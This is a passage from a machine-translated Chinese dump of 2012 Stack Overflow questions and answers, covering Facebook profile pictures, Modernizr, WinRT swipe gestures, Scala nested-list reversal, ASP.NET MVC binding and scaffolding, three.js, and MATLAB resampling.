可以想象，小图像显示完美，但是当我单击具有 href 的小图像时，它无法显示大图像。

我试图将大图像变量更改为此：

```
$large = "https://graph.facebook.com/{$id2}/picture?type=large&redirect=false"; 
```

但它也未能显示大图像..

希望能帮到你，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T22:55:15.207

`https://graph.facebook.com/{$id2}/picture?type=large&redirect=false`基本上为您返回一个文本内容图像的 URL。这就是它不显示的原因。

例如。

```
https://graph.facebook.com/yungsenriady.budiman.3/picture?type=large&redirect=false 
```

返回

```
"https://fbcdn-profile-a.akamaihd.net/hprofile-ak-ash3/157348_100001167523294_1569184886_n.jpg" 
```

尝试使用

```
https://graph.facebook.com/{$id2}/picture?type=large 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T02:43:56.690

我之前没有使用过 Shadowbox，所以我不知道它在幕后是如何工作的。可能是它无法处理为大图像返回另一个 url 的 url。

尝试使用 php 进行 API 调用，然后将此结果传递给 shadowbox。

```
$large = file_get_contents("https://graph.facebook.com/{$id2}/picture?type=large&redirect=false"); 
```

当然，`file_get_contents()`像这样使用是一种快速而肮脏的方法。如果可行，在将其推广到生产站点之前，您需要使用`cURL`或更好的[Facebook PHP SDK](https://developers.facebook.com/docs/reference/php)来执行此操作。

假设您使用 shadowbox 在一个页面上显示多个用户的照片，您最终可能会在某个时候遇到 API 限制。为防止这种情况，请重做 API 调用以一次抓取多张照片：

```
$large_photos = $fb->api('/picture?type=large&redirect=false&ids=' . 
                           implode($ids_array, ',')); 
```

# modernizr - HTML5 Shiv 未使用 Modernizr 初始化

> ID：12648313
> 
> 赞同：1
> 
> 时间：2012-09-28T22:46:22.060
> 
> 标签：modernizr, html5shiv

我正在我的网站上运行 Modernizr 的完整开发版本，虽然 html5shiv 包含在 Modernizr 中，但它似乎没有运行。如果我将 html5shiv 作为单独的脚本添加到页面，一切都会很好。Modernizr 的其余部分也运行良好。我是否必须以某种方式在 Modernizr 中初始化 html5shiv？文档使它看起来像是自动运行的。

这是我页面顶部的代码：

```
<script src="/assets_site/js/head.load.min.js"></script>
<script>
  head.js(
    { modernizr: '/assets_site/js/modernizr.js' },
    { jquery: '//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js' },
    { placeholder: '/assets_site/js/jquery.placeholder.min.js' },
    { response: '/assets_site/js/jquery.response.min.js' }
  );
</script> 
```

以及在 Modernizr 没有的地方运行的单独的 html5shiv 代码：

```
<!--[if lt IE 9]>
  <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]--> 
```

愚蠢的问题，但我很困惑。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-01T17:13:29.603

2件事：

1.  您是否检查过您的下载中是否包含 shiv？[http://modernizr.com/download/](http://modernizr.com/download/)
2.  您在文档的哪个位置加载modernizr.js？可能需要将其加载到头部而不是页面底部。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-01T22:43:45.717

啊，想通了。问题是我是个笨蛋。

html5shiv 在 Modernizr 中加载良好，但我也将 response.js 设置为在该条件 IE 片段中运行。当我删除 html5shiv 脚本时，我同时删除了 respond.js，这导致布局变得疯狂。我完全忽略了媒体查询部分，并认为这是一个 html5 问题。

谜团解开了（尽管我是个笨蛋并不神秘）。

# c# - 在 WinRT 应用程序中处理向上滑动、向下滑动、向左滑动和向右滑动手势

> ID：12648318
> 
> 赞同：15
> 
> 时间：2012-09-28T22:46:41.163
> 
> 标签：c#, .net, xaml, windows-runtime, windows-store

我有以下代码：

```
public MainPage()
{
    this.InitializeComponent();
    this.ManipulationStarting += MainPage_ManipulationStarting;
    this.ManipulationStarted += MainPage_ManipulationStarted;
    this.ManipulationInertiaStarting += MainPage_ManipulationInertiaStarting;
    this.ManipulationDelta += MainPage_ManipulationDelta;
    this.ManipulationCompleted += MainPage_ManipulationCompleted;
}
void MainPage_ManipulationStarting(object sender, ManipulationStartingRoutedEventArgs e)
{
    Debug.WriteLine("MainPage_ManipulationStarting");
}
void MainPage_ManipulationStarted(object sender, ManipulationStartedRoutedEventArgs e)
{
    Debug.WriteLine("MainPage_ManipulationStarted");
}
void MainPage_ManipulationInertiaStarting(object sender, ManipulationInertiaStartingRoutedEventArgs e)
{
    Debug.WriteLine("MainPage_ManipulationInertiaStarting");
}
void MainPage_ManipulationDelta(object sender, ManipulationDeltaRoutedEventArgs e)
{
    Debug.WriteLine("MainPage_ManipulationDelta");
}
void MainPage_ManipulationCompleted(object sender, ManipulationCompletedRoutedEventArgs e)
{
    Debug.WriteLine("MainPage_ManipulationCompleted");
} 
```

但我不知道如何使用 Manipulation 事件。你能描述一下如何处理向上、向下、向左和向右滑动的手势吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-30T15:21:16.363

操作事件为您提供翻译值。操作 Delta 将持续触发，直到您的操作与惯性一起完成。在这种情况下，检查移动是否是惯性的（不应将正常移动视为滑动）并检测初始位置和当前位置之间的差异。

一旦达到阈值，触发向上/向下/向左/向右滑动事件。并立即停止操作以避免一次又一次地触发相同的事件。

以下代码将为您提供帮助，

```
 private Point initialpoint;

    private void Grid_ManipulationStarted_1(object sender, ManipulationStartedRoutedEventArgs e)
    {
        initialpoint = e.Position;
    }

    private void Grid_ManipulationDelta_1(object sender, ManipulationDeltaRoutedEventArgs e)
    {
        if (e.IsInertial)
        {
            Point currentpoint = e.Position;
            if (currentpoint.X - initialpoint.X >= 500)//500 is the threshold value, where you want to trigger the swipe right event
            {
                System.Diagnostics.Debug.WriteLine("Swipe Right");
                e.Complete();
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-15T18:03:27.253

我尝试了 XAML 爱好者的答案，但对我来说并不是那么准确（IsIntertial 对我来说总是错误的）。我为任何想要尝试不同事物的人实现了一些不同的东西（我回复了相关主题的前一篇文章，这里[是在 Windows 8 Grid 中处理滑动访客）。](https://stackoverflow.com/questions/10798347/handling-swipe-guesture-in-windows-8-grid)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-10T18:13:37.500

看看[GestureRecognizer](http://msdn.microsoft.com/en-us/library/windows/apps/windows.ui.input.gesturerecognizer.aspx) .CrossSliding 事件。还有[EdgeGesture](http://msdn.microsoft.com/library/windows/apps/Hh701600)类和示例：[EdgeGesture 示例](http://code.msdn.microsoft.com/windowsapps/Edge-gesture-invocation-76a474dd)、[手势示例](http://code.msdn.microsoft.com/windowsapps/Input-Windows-8-gestures-62c6689b)。

# ios - Interface Builder“视图-图像视图”关系

> ID：12648319
> 
> 赞同：0
> 
> 时间：2012-09-28T22:46:46.053
> 
> 标签：ios, xcode, interface-builder

我正在学习教程，我需要重现一种情况。

在 Interface Builder 中，我想将我的视图（iucontrollerview）与如下图所示的“图像视图”连接起来：

![在此处输入图像描述](../Images/d9071d6215523b2f541cd171b57c6381.png)

在我的项目中，我有一个“视图 - 视图”关系，如下图所示：

![在此处输入图像描述](../Images/80b1cef38adc45781b65107eb20a1bf4.png)

如何获得“视图 - 图像视图”关系？

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:56:23.510

在 Xcode（Interface Builder）中，在身份检查器的右侧面板中，您可以设置视图 IBOutlet 的类名。输入 UIImageView。这会将视图类从 UIView 更改为 UIImageView。

# ruby - 在 Ruby 处理类/草图中包含模块

> ID：12648324
> 
> 赞同：1
> 
> 时间：2012-09-28T22:47:08.590
> 
> 标签：ruby, processing

当我尝试将模块包含到 Ruby-Processing 草图中时，它返回以下 StackOverflowError：

```
matt$ rp5 run cylinder_test.rb
matt$ Error: Your application used more stack memory than the safety cap.
Specify -J-Xss####k to increase it (#### = cap size in KB).
Specify -w for full StackOverflowError stack trace 
```

使用 -w 运行草图不提供额外信息。

模块 Cylinder 包括**Processing::Proxy**模块，以便访问 begin_shape 和 end_shape 方法等。我尝试将方法定义为类方法和实例方法（在方法定义之前有和没有“self.”）。

```
module Cylinder
    include Processing::Proxy
    def self.cylinder( sides, r1, r2, h )
... 
```

我尝试删除“include Processing::Proxy”行，但它只是告诉我有未定义的常量和方法，它们包含在 Processing::Proxy 中。所以这可能不是问题。

我的草图的标题如下所示：

```
class CylinderTest < Processing::App

    load '../controllers/branch_controller.rb'
    load '../controllers/node_controller.rb'

    require 'Cylinder.rb'
    include Cylinder
... 
```

我应该指出我相信这些方法是有效的，因为当我将 Cylinder 模块本身编写为 Ruby-Processing 草图时，它运行良好。

我正在使用 Ruby-Processing 1.0.11 和 Ruby 1.8.7。

那么，如何在不导致堆栈溢出错误的情况下包含 Cylinder 模块？

# android - Aniqroid SlidingTray NullRefferenceException？

> ID：12648333
> 
> 赞同：2
> 
> 时间：2012-09-28T22:49:12.507
> 
> 标签：android, android-widget

我正在尝试使用[SlidingTray](http://code.google.com/p/aniqroid/)。但是将示例添加到我的视图中它会给出`NullPointerException`.`SlidingTray.onLayout()`

在安卓 4.1 上测试。

堆：

```
09-29 01:31:06.840: E/AndroidRuntime(8905): FATAL EXCEPTION: main
09-29 01:31:06.840: E/AndroidRuntime(8905): java.lang.NullPointerException
09-29 01:31:06.840: E/AndroidRuntime(8905):     at com.sileria.android.view.SlidingTray.onLayout(Unknown Source)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.RelativeLayout.onLayout(RelativeLayout.java:925)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1628)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1486)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.onLayout(LinearLayout.java:1399)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.FrameLayout.onLayout(FrameLayout.java:431)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1628)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1486)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.LinearLayout.onLayout(LinearLayout.java:1399)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.widget.FrameLayout.onLayout(FrameLayout.java:431)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.View.layout(View.java:11359)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewGroup.layout(ViewGroup.java:4571)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1665)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2700)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.os.Handler.dispatchMessage(Handler.java:99)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.os.Looper.loop(Looper.java:156)
09-29 01:31:06.840: E/AndroidRuntime(8905):     at android.app.ActivityThread.main(ActivityThread.java:5045) 
```

任何想法为什么我会看到这个异常？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-15T00:09:53.007

我已经使用这个库有一段时间了，并且遇到了同样的错误。由于我将项目变成了一个 android 库项目，而不仅仅是使用 jar，所以我能够检测到错误在哪里。

在第 455 行，`switch (mHandlePos) {`这里是空指针。

查看代码，这个 mHandlePos 有一个 setter，所以我所做的就是调用这个 setter，我很高兴。看看这个：

```
FrameLayout content = (FrameLayout) LayoutInflater.from(this).inflate(R.layout.historico_main, null);
    ImageView handler = new Tools(this).newImage(R.drawable.historico_handler);

    SlidingTray historico = new SlidingTray(this, handler, content, SlidingTray.TOP);

    RelativeLayout parent = (RelativeLayout) this.findViewById(R.id.main_parent);
    historico.setHandlePosition(Side.TOP);
    parent.addView(historico, new RelativeLayout.LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT)); 
```

我认为开发人员忘记在构造函数中设置处理程序的默认位置。好吧，调用`setHandlePosition`为我工作而无需更改源代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-14T08:46:52.633

我使用了这个库，我也遇到了同样的错误。有一个公共方法

```
slidingTray.setHandlePosition(Side side); 
```

只需调用此函数并将您的身边传递为

```
slidingTray.setHandlePosition(Side.BOTTOM); 
```

那么它将起作用。

但是我有一个问题，我没有进行滑动，我不知道为什么...... :-(

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-16T16:15:50.803

对于这个错误，我很抱歉。我已经解决了新版本 3.5 中的问题，该版本可直接从我的网站获得： http: [//aniqroid.sileria.com](http://aniqroid.sileria.com)

感谢您使用该库，并随时报告错误。

# list - Scala中嵌套列表的深度反转

> ID：12648335
> 
> 赞同：14
> 
> 时间：2012-09-28T22:49:45.097
> 
> 标签：list, scala, recursion

我想在Scala中递归地反转列表列表。

我在 Python 中编写了这样的深度列表反转：

```
def deepReverse(items):
    if type(items) == list:
        return [deepReverse(item) for item in reversed(items)]
    else: 
        return items 
```

我将如何在 Scala 中做同样的事情？问题不在于算法 - 它是类型的东西，我比较新。

我需要该函数将 [T] 列表或 List[List[T]] 或 T 列表和 T 列表获取到任意深度。我尝试根据我在其他地方看到的示例制作一个案例类来做到这一点。我不想要一个只返回 Any 并接受 Any 的函数；感觉就像在作弊。

```
case class NL[+T](val v : Either[List[NL[T]],T]) 
```

尽管如此，我还是无法完全平衡我的类型。我是 Scala 的新手，但我认为这将是一个处理递归和打字的绝佳机会。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-09-28T23:44:29.600

实际上，编写 sschaef 提出的适用于任意嵌套列表的类型类方法的版本并不难：

```
trait Reverser[C] {
  def reverse(xs: C): C
}

implicit def rev[A](implicit ev: Reverser[A] = null) = new Reverser[List[A]] {
  def reverse(xs: List[A]) =
    Option(ev).map(r => xs map r.reverse).getOrElse(xs).reverse
}

def deepReverse[A](xs: A)(implicit ev: Reverser[A]): A = ev.reverse(xs) 
```

`ev`我们方法中的隐含参数`rev`证明它`A`本身是可逆的，如果`ev`为 null 则表示不可逆。如果我们有这个可逆的证据`A`，我们用它来反转我们的元素`List[A]`（这就是我们`map`正在做的事情），然后我们反转列表本身。如果我们没有这个证据（`getOrElse`案件），我们可以把清单倒过来。

我们可以写得`rev`不那么简洁（但可能更高效），如下所示：

```
implicit def rev[A](implicit ev: Reverser[A] = null) = if (ev == null) {
  new Reverser[List[A]] {
    def reverse(xs: List[A]) = xs.reverse
  }
} else {
  new Reverser[List[A]] {
   def reverse(xs: List[A]) = (xs map ev.reverse).reverse
  }
} 
```

要测试这两个版本中的任何一个，我们可以编写以下代码：

```
scala> deepReverse(List.tabulate(3)(identity))
res0: List[Int] = List(2, 1, 0)

scala> deepReverse(List.tabulate(2,3) { case (a, b) => a + b })
res1: List[List[Int]] = List(List(3, 2, 1), List(2, 1, 0))

scala> deepReverse(List.tabulate(2, 3, 4, 5, 6) {
     |   case (a, b, c, d, e) => a + b + c + d + e
     | }).head.head.head.head
res2: List[Int] = List(15, 14, 13, 12, 11, 10) 
```

正如预期的那样。

* * *

我应该补充一点，在这种情况下，以下是一个更常见的习语，用于正确获取隐式：

```
trait ReverserLow {
  implicit def listReverser[A] = new Reverser[List[A]] {
    def reverse(xs: List[A]) = xs.reverse
  }
}

object ReverserHigh extends ReverserLow {
  implicit def nestedListReverser[A](implicit ev: Reverser[A]) =
    new Reverser[List[A]] {
      def reverse(xs: List[A]) = xs.map(ev.reverse).reverse
    }
}

import ReverserHigh._ 
```

如果我们只是在同一级别编写`listReverser`，`nestedListReverser`当我们尝试反转列表列表时会收到以下错误：

```
scala> deepReverse(List.tabulate(2, 3)(_ + _))
<console>:12: error: ambiguous implicit values:
 both method listReverser...
 and method nestedListReverser...
 match expected type Reverser[List[List[Int]]]
              deepReverse(List.tabulate(2, 3)(_ + _)) 
```

对两者进行优先级排序的标准方法是将较低优先级隐含在特征 ( ) 中，将另一个隐含在扩展该特征`WhateverLow`的对象 ( ) 中。`WhateverHigh`但是，在这样一个相当简单的情况下，在我上面的方法中使用默认参数技巧会更简洁（在我看来也更清晰）`rev`。但是您更有可能在其他人的代码中看到其他版本。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-28T23:11:25.443

如果你想拥有这个真正的类型安全，那么类型类模式就是你的朋友：

```
object Reverse extends App {

  trait Reverser[C] {
    def reverse(xs: C): C
  }

  implicit def List1Reverser[A] = new Reverser[List[A]] {
    def reverse(xs: List[A]) =
      xs.reverse
  }

  implicit def List2Reverser[A] = new Reverser[List[List[A]]] {
    def reverse(xs: List[List[A]]) =
      xs.map(_.reverse).reverse
  }

  implicit def List3Reverser[A] = new Reverser[List[List[List[A]]]] {
    def reverse(xs: List[List[List[A]]]) =
      xs.map(_.map(_.reverse).reverse).reverse
  }

  def deepReverse[A](xs: A)(implicit rev: Reverser[A]): A =
    rev.reverse(xs)

  val xs = List(1,2)
  val xxs = List(List(1,2),List(1,2),List(1,2))
  val xxxs = List(List(List(1,2),List(1,2)),List(List(1,2),List(1,2)),List(List(1,2),List(1,2)))

  println(deepReverse(xs))
  println(deepReverse(xxs))
  println(deepReverse(xxxs))
} 
```

唯一的问题是每个嵌套列表类型都需要一个类型类。

# asp.net-mvc - mvc表单不发布表格日期

> ID：12648337
> 
> 赞同：1
> 
> 时间：2012-09-28T22:49:47.530
> 
> 标签：asp.net-mvc, razor

我确定我遗漏了一些非常明显的东西，或者我不理解我到目前为止所读到的内容。我有一个包含数据表的 from，其中 2 个字段需要可编辑。表单接收到的数据是`IEnumerable`. 但是，当控制器功能接收到发布数据时`IEnumerable`，我没有收到任何信息。如果我只收到原始数据类型，我会得到具有正确 id 字段的对象的单个实例，并且所有其他字段都是空的。有人可以指出我正确的方向吗？

## MODEL：（由EF Model先生成）

```
Partial Public Class QuoteBundlePackage_Result
    Public Property id As Integer
    Public Property employeeId As Nullable(Of Integer)
    Public Property employeeName As String
    Property bundleId As Nullable(Of Integer)
    Public Property bundleDescription As String
    Public Property packageId As Nullable(Of Integer)
    Public Property packageContents As String
End Class 
```

## 看法：

```
@ModelType IEnumerable(Of gbip_new.QuoteBundlePackage_Result)

@Using Html.BeginForm()
@Html.ValidationSummary(True)
<fieldset>      
<legend>Quote</legend>
<table>
    <tr>
        <th>
            @Html.DisplayNameFor(Function(model) model.employeeId)
        </th>
        <th>
            @Html.DisplayNameFor(Function(model) model.employeeName)
        </th>
        <th>
            @Html.DisplayNameFor(Function(model) model.bundleId)
        </th>
        <th>
            @Html.DisplayNameFor(Function(model) model.bundleDescription)
        </th>
        <th>
            @Html.DisplayNameFor(Function(model) model.packageId)
        </th>
        <th>
            @Html.DisplayNameFor(Function(model) model.packageContents)
        </th>
        <th></th>
    </tr>

    @For Each item In Model
        Dim currentItem = item
        Html.HiddenFor(Function(modelItem) currentItem.id)
        @<tr>
            <td>
                @Html.DisplayFor(Function(modelItem) currentItem.employeeId)
            </td>
            <td>
                @Html.DisplayFor(Function(modelItem) currentItem.employeeName)
            </td>
            <td>
                @Html.EditorFor(Function(modelItem) currentItem.bundleId)
            </td>
            <td>
                @Html.DisplayFor(Function(modelItem) currentItem.bundleDescription)
            </td>
            <td>
                @Html.EditorFor(Function(modelItem) currentItem.packageId)
            </td>
            <td>
                @Html.DisplayFor(Function(modelItem) currentItem.packageContents)
            </td>
        </tr>
    Next
</table>
<p>            
    <input id="Submit1" type="submit" value="submit" />
</p>
</fieldset>
End Using 
```

## 控制器

```
 <HttpPost()> _
    Function QuoteBundlePackage(ByVal eqDetails As IEnumerable(Of Global.gbip_new.QuoteBundlePackage_Result)) As ActionResult
        If ModelState.IsValid Then

            'Do stuff

            Return RedirectToAction("Index")
        End If

        Return View(eqDetails)
    End Function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:05:19.920

模型绑定到集合的工作方式略有不同。如果您希望正确绑定您的集合，则需要有效地对循环中的每个项目进行编号。

What you want to render is something like...

```
<input type="text" name="QuoteBundlePackage_Result[0].EmployeeID" value="" />
<input type="text" name="QuoteBundlePackage_Result[0].EmployeeName" value="" />

<input type="text" name="QuoteBundlePackage_Result[1].EmployeeID" value="" />
<input type="text" name="QuoteBundlePackage_Result[1].EmployeeName" value="" /> 
```

... which will allow the framework to distinguish between each item. To create this arrangement you should give each item an ID within your loop - (Sorry in advance for answer being in c# and not vb!)

```
@for (int i = 0; i < Model.Count(); i++)
{
    @Html.EditorFor(e => e[i].EmployeeID)
    @Html.EditorFor(e => e[i].EmployeeName)
} 
```

See related articles from [Scott Hansleman](http://www.hanselman.com/blog/ASPNETWireFormatForModelBindingToArraysListsCollectionsDictionaries.aspx) and [Phil Haack](http://haacked.com/archive/2008/10/23/model-binding-to-a-list.aspx).

# javascript - 如何制作展开时比关闭时更宽的选项列表

> ID：12648338
> 
> 赞同：0
> 
> 时间：2012-09-28T22:49:48.793
> 
> 标签：javascript, jquery, html

我想创建一个具有固定宽度的选择列表，但是当您单击以展开它时，其他选项可以更宽以容纳更长的字符串。有点像超级菜单

这个 asp.net 控件就是我所说的一个例子：http: [//www.codeproject.com/Articles/137454/Extended-DropDownList](http://www.codeproject.com/Articles/137454/Extended-DropDownList)

我正在寻找一个 html/javascript/css 解决方案（jquery 很好）。我试过谷歌搜索，但我不知道这种行为叫什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:05:31.703

我可能忽略了一些东西，但就像 Ohgodwhy 和 Sheikh Heera 所说，这是一个非常标准的功能。简单地使用css来设置select标签的宽度会设置静态显示宽度，当点击select时，无论相对于select容器的宽度如何，都会显示结果。

这是一个例子：

```
<select style="width: 100px;">
<option>Short</option>
<option>This is a really really really long option</option>
</select> 
```

# three.js - threejs 从轨迹球控件中检索欧拉角？

> ID：12648339
> 
> 赞同：0
> 
> 时间：2012-09-28T22:50:14.130
> 
> 标签：three.js

我正在使用three.js 轨迹球控件围绕我的对象旋转。但是，当用户不主动使用轨迹球时，我希望视图慢慢地围绕垂直轴旋转。

有人知道我会怎么做吗？我试着改变 camera.rotation.y 但它没有做任何事情。

谢谢鲍勃

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:09:56.827

最简单的解决方案是`OrbitControls`改用，并设置`controls.autoRotate = true`.

# asp.net-mvc - MVC3 Scaffolding 不会在存在外键的视图中生成下拉菜单

> ID：12648340
> 
> 赞同：1
> 
> 时间：2012-09-28T22:50:14.830
> 
> 标签：asp.net-mvc, asp.net-mvc-3, entity-framework, entity-framework-5

这让我发疯，我研究了 StackOverflow 上的相关帖子。

基本上我有两张表，专辑和流派，前者有一个流派的外键。我在 EF5 中使用 Model First 对此进行了建模，并使用 MS 的 T4 生成器生成了上下文和类文件。因此我的域类代码是：

```
{
using System;
using System.Collections.Generic;

public partial class Album
{
    public int Id { get; set; }
    public string Title { get; set; }
    public decimal Price { get; set; }
    public string AlbumArtUrl { get; set; }

    public int GenreId {get; set;}
    public virtual Genre Genre { get; set; }
}
} 
```

你会注意到我添加了：

```
public int GenreId {get; set;} 
```

根据指导，以便使脚手架能够在控制器中的视图和“SelectList”代码中创建下拉列表。但事实并非如此！但是，它确实在视图中创建：

```
 <div class="editor-label">
        @Html.LabelFor(model => model.GenreId)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.GenreId)
        @Html.ValidationMessageFor(model => model.GenreId)
    </div> 
```

所以我真的很困惑。任何想法将不胜感激。

谢谢，

埃德

PS我似乎正在运行带有ASP.NET MVC 3 Tools Update的VS2010 SP1，因为我尝试安装它并且它说它已经安装了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:56:55.967

耶...啊啊！！！我已经让它与 MS Scaffold 一起工作。现在我需要弄清楚如何。我认为问题在于我使用的是模型优先，我需要确保将额外的外键属性添加到模型中，而不仅仅是域类代码中，它需要在 EDMX 中。但是，这会产生另一个问题，即现在在 SQL Server 中创建了 2 个字段，一个来自 Navigation 属性，另一个来自该字段。我可能需要玩映射。我会

生成的控制器代码：

```
 // GET: /Album/Create

    public ActionResult Create()
    {
        ViewBag.GenreId = new SelectList(db.Genre, "Id", "Name");
        return View();
    } 
```

相关查看代码：

```
 <div class="editor-label">
        @Html.LabelFor(model => model.GenreId, "Genre")
    </div>
    <div class="editor-field">
        @Html.DropDownList("GenreId", String.Empty)
        @Html.ValidationMessageFor(model => model.GenreId)
    </div> 
```

这就是我想要的。显然，如果有人想对此发表评论，那就太好了，但它确实有效。

谢谢。

# ruby-on-rails - Rails HTTParty 关闭服务器

> ID：12648342
> 
> 赞同：1
> 
> 时间：2012-09-28T22:50:21.583
> 
> 标签：ruby-on-rails, ruby

我正在向 httparty 从服务器检索信息的控制器发送 ajax 请求。我遇到的问题是，当我将 ajax 发布请求发送到控制器时，本地 webbrick 服务器关闭。我收到分段错误错误。知道问题是什么吗？

要点：[https ://gist.github.com/3802531](https://gist.github.com/3802531)

# matlab - 组合不同频率的数据矩阵

> ID：12648348
> 
> 赞同：3
> 
> 时间：2012-09-28T22:51:08.730
> 
> 标签：matlab, time-series, fill

在 MATLAB 中，如何**组合以不同频率测量的两个数据矩阵，以**使**结果以更高的频率索引**？由于以较低频率测量的数据在结果中会有很多未知值，我想用**矩阵中的最后一个已知值**替换它们。有很多数据，因此首选**矢量化解决方案。**我在下面添加了一些示例数据。

**鉴于：**

```
 index1  data1  index2  data2
    1       2.1    2       30.5
    2       3.3    6       32.0
    3       3.5    9       35.0
    4       3.9    13      35.5
    5       4.5    17      34.5
    6       5.0    20      37.0
    7       5.2    ...     ...
    8       5.7
    9       6.8
    10      7.9
    ...     ... 
```

**结果：**

```
 index1  data1  data2
    1       2.1    NaN
    2       3.3    30.5
    3       3.5    30.5
    4       3.9    30.5
    5       4.5    30.5
    6       5.0    32.0
    7       5.2    32.0
    8       5.7    32.0
    9       6.8    35.0
    10      7.9    35.0
    ...     ...    ... 
```

**编辑：** 我认为以下帖子接近我需要的内容，但我不确定如何转换解决方案以适应我的问题。 [http://www.mathworks.com/matlabcentral/newsreader/view_thread/260139](http://www.mathworks.com/matlabcentral/newsreader/view_thread/260139)

**编辑（几个月后）：** 我最近遇到了这个出色的小功能，我认为它可能对任何登陆这篇文章的人有用：

```
function yi = interpLast(x,y,xi)
%INTERPLAST Interpolates the input data to the last known value.
% Note the index data should be input in ASCENDING order.
inds = arrayfun(@findinds, xi);
yi = y(inds);

function ind = findinds(val)
    ind = find(x<=val,1,'last');
    if isempty(ind)
        ind = 1;
    end
end

end 
```

信用在这里：[http ://www.mathworks.com/support/solutions/en/data/1-48KETY/index.html?product=SL&solution=1-48KETY](http://www.mathworks.com/support/solutions/en/data/1-48KETY/index.html?product=SL&solution=1-48KETY)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T00:10:33.423

问题是运行长度解码之一。[请参阅Matlab 数组操作技巧和技巧](http://home.online.no/~pjacklam/matlab/doc/mtt/doc/mtt.pdf)的第 15.5.2 节（这对任何 Matlab 爱好者来说都是令人大开眼界的读物）。

这是在您的示例中使用该方法（我使用的是[octave](http://www.gnu.org/software/octave/)，但 Matlab 的代码是相同的）：

```
octave:33> a=[2,30.5;6,32;9,35;13,35.5;17,34.5;20,37]
a =

    2.0000   30.5000
    6.0000   32.0000
    9.0000   35.0000
   13.0000   35.5000
   17.0000   34.5000
   20.0000   37.0000

octave:34> i=a(:,1)-1
i =

    1
    5
    8
   12
   16
   19

octave:35> j=zeros(1,i(end))
j =

   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0

octave:36> j(i(1:end-1)+1)=1
j =

   0   1   0   0   0   1   0   0   1   0   0   0   1   0   0   0   1   0   0

octave:37> j(1)=1
j =

   1   1   0   0   0   1   0   0   1   0   0   0   1   0   0   0   1   0   0

octave:38> val=a(:,2)
val =

   30.500
   32.000
   35.000
   35.500
   34.500
   37.000

octave:39> x=val(cumsum(j))
x =

   30.500
   32.000
   32.000
   32.000
   32.000
   35.000
   35.000
   35.000
   35.500
   35.500
   35.500
   35.500
   34.500
   34.500
   34.500
   34.500
   37.000
   37.000
   37.000 
```

并根据需要用 NaN 填充开头。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-29T07:30:14.017

我最近遇到了和你一样的问题：我有数据，由不同的系统测量，必须同步和处理。

我的解决方案包括将测量数据和时间信息（频率、测量开始时的时间）放在一个[类对象](http://www.mathworks.nl/help/matlab/object-oriented-programming.html)中。然后我为该类实现了一个乘法、加法等方法，该方法自动处理所有必要的事情，即：

*   对低频信号进行上采样（使用线性插值（[interp1](http://www.mathworks.nl/help/matlab/ref/interp1.html)）
*   移动其中一个信号，使数据及时排列
